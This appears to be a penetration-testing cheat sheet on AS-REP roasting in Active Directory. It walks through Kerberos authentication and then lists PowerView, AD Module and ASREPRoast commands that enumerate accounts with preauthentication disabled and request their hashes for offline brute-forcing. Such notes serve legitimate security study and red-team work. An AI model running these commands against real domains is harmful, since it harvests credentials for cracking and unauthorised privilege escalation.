# Domain Privilege Escalation - AS REP Roasting

If pre-authentication is disabled on a user account or a service account , meaning that UserAccountControl settings have `Don not require Kerberos preauthentication`, then it is possbile to request a TGT for that user account without any password but a valid username is required

## Steps in Kerberos

- **User logs on with username & password.**

- **Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (Key Distribution Centre also known as Domain Controller) as an authenticator in the authentication ticket (TGT) request  Authenitcation Service Request (AS-REQ).  The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).**

- **The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.**

- The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum . If the DC can open the ticket & the checksum check out, `TGT = valid`. The data in the TGT is effectively copied to create the TGS ticket.

- The TGS is encrypted using the target service accounts’s NTLM password hash and sent to the user (TGS-REP)

- The user connects to the server hosting the service on the appropriate port & presents the TGS Application Request (AP-REQ). The service opens the TGS ticket using its NTLM password hash.

- Optional mutual authentication is done by service that the user provides TGS ticket to

## PowerView (dev)

### Enumerating accounts with Kerberos preauth disabled

```
Get-DomainUser -PreauthNotRequired -Verbose
```

### Request encrypted AS-REP for offline brute force 

## AD Module

### Enumerating accounts with Kerberos preauth disabled

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

## ASREP Roast

https://github.com/HarmJ0y/ASREPRoast


### Request encrypted AS-REP for offline brute force

```
Get-ASREPHash -Username user -Verbose
```

### To enumerate all users with kerberos preauth disable and request a hash

```
Invoke-ASREPRoast -Verbose
```